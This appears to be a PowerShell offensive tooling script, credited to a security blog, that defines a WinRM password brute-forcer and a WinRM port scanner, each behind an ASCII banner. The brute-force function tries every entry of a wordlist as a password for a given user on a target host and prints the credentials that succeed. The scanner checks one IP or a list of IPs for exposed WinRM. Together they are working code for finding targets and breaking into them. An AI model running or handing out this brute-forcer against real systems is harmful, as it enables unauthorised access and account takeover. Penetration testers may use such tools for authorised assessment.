function winrm_brute {

Write-Output " ___       __   ___  ________   ________  _____ ______           ________  ________  ________  ________   ________   _______   ________     "
Write-Output "|\  \     |\  \|\  \|\   ___  \|\   __  \|\   _ \  _   \        |\   ____\|\   ____\|\   __  \|\   ___  \|\   ___  \|\  ___ \ |\   __  \    "
Write-Output "\ \  \    \ \  \ \  \ \  \\ \  \ \  \|\  \ \  \\\__\ \  \       \ \  \___|\ \  \___|\ \  \|\  \ \  \\ \  \ \  \\ \  \ \   __/|\ \  \|\  \   "
Write-Output " \ \  \  __\ \  \ \  \ \  \\ \  \ \   _  _\ \  \\|__| \  \       \ \_____  \ \  \    \ \   __  \ \  \\ \  \ \  \\ \  \ \  \_|/_\ \   _  _\  "
Write-Output "  \ \  \|\__\_\  \ \  \ \  \\ \  \ \  \\  \\ \  \    \ \  \       \|____|\  \ \  \____\ \  \ \  \ \  \\ \  \ \  \\ \  \ \  \_|\ \ \  \\  \| "
Write-Output "   \ \____________\ \__\ \__\\ \__\ \__\\ _\\ \__\    \ \__\        ____\_\  \ \_______\ \__\ \__\ \__\\ \__\ \__\\ \__\ \_______\ \__\\ _\ "
Write-Output "    \|____________|\|__|\|__| \|__|\|__|\|__|\|__|     \|__|       |\_________\|_______|\|__|\|__|\|__| \|__|\|__| \|__|\|_______|\|__|\|__|"
Write-Output "                                                                   \|_________|                                                             "
Write-Output "                                                                                                                                            "
Write-Output " Author: https://ctrlaltdel.blog"
Write-Output "`n"

# Gather Details

$computername = Read-Host -Prompt "computername"
$username = Read-Host -Prompt "username"
$wordlist = Read-Host -Prompt "wordlist"

#Get the wordlist
$passwords = Get-Content $wordlist

foreach ($password in $passwords) {

#clear all errors
        $Error.clear()

#Convert values and place them within PSCRED

         
         $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
         $mycredential = New-Object System.Management.Automation.PSCredential ($username, $secpassword)

         #Test Connection of each password
        
         $result = Test-WSMan -ComputerName $computername -Credential $mycredential -Authentication Negotiate -erroraction SilentlyContinue


         # If connection fails, no error and pass nothing

if ($result -eq $null) {

Write-Output "Testing Password: $password = Failed"
Write-Output "`n"
#reset the end password
$yourpassword = $null

} else {

#results are successfull and show the password

Write-Output "Testing Password: $password = Success"
$yourpassword = $password
Write-Output "`n"
}

if ($yourpassword -eq $null) {

} Else {

#Print out the credenetials that worked 

Write-Output "Credentails for $computername are $username and $password"

}

}
}

function Winrm_scanner {


Write-Output " ___       __   ___  ________   ________  _____ ______           ________  ________  ________  ________   ________   _______   ________     "
Write-Output "|\  \     |\  \|\  \|\   ___  \|\   __  \|\   _ \  _   \        |\   ____\|\   ____\|\   __  \|\   ___  \|\   ___  \|\  ___ \ |\   __  \    "
Write-Output "\ \  \    \ \  \ \  \ \  \\ \  \ \  \|\  \ \  \\\__\ \  \       \ \  \___|\ \  \___|\ \  \|\  \ \  \\ \  \ \  \\ \  \ \   __/|\ \  \|\  \   "
Write-Output " \ \  \  __\ \  \ \  \ \  \\ \  \ \   _  _\ \  \\|__| \  \       \ \_____  \ \  \    \ \   __  \ \  \\ \  \ \  \\ \  \ \  \_|/_\ \   _  _\  "
Write-Output "  \ \  \|\__\_\  \ \  \ \  \\ \  \ \  \\  \\ \  \    \ \  \       \|____|\  \ \  \____\ \  \ \  \ \  \\ \  \ \  \\ \  \ \  \_|\ \ \  \\  \| "
Write-Output "   \ \____________\ \__\ \__\\ \__\ \__\\ _\\ \__\    \ \__\        ____\_\  \ \_______\ \__\ \__\ \__\\ \__\ \__\\ \__\ \_______\ \__\\ _\ "
Write-Output "    \|____________|\|__|\|__| \|__|\|__|\|__|\|__|     \|__|       |\_________\|_______|\|__|\|__|\|__| \|__|\|__| \|__|\|_______|\|__|\|__|"
Write-Output "                                                                   \|_________|                                                             "
Write-Output "                                                                                                                                            "

Write-Output "Choose an option:"
Write-Output "`n"
Write-Output "Option 1: Single IP Scan             |       Option 2: IP List Scan        "
Write-Output "`n"
#Prompt For Options

$options = Read-Host -Prompt "Chosen Option (Enter 1 or 2)"


# User has chosen IPList

if ($options -eq "2") {

# Prompt for IPList

$iplist = Read-Host -Prompt "Please enter IPList location (Example: C:\Temp\IPlist.txt)"

#Get the IPList

$ips = Get-Content $iplist


foreach ($serverip in $ips){

#For each IP, Scan WINRM

$results = test-netconnection -ComputerName "$serverip" -CommonTCPPort WINRM -InformationLevel Quiet



if ($results -eq "True"){

#If successful, write message

Write-Output "$serverip has WinRM service enabled"


} 

#If failed, write message

elseif ($results -eq "False" -or $results -contains "failed") {

Write-Output "$serverip doesn't appear to be running WinRM"


}

}

# User has chosen Single IP

} elseif ($options -eq "1"){

# Prompt for IP Address

$singleip = Read-Host -Prompt "Enter the IP Address"

#Test WINRM against IP

$result = test-netconnection -ComputerName "$singleip" -CommonTCPPort WINRM -InformationLevel Quiet

#If successful, write message

if ($result -eq "True"){

Write-Output "$singleip has WinRM service enabled"


} 

#If failed, write message

elseif ($result -eq "False" -or $result -contains "failed") {

Write-Output "$singleip doesn't appear to be running WinRM"


}

}

}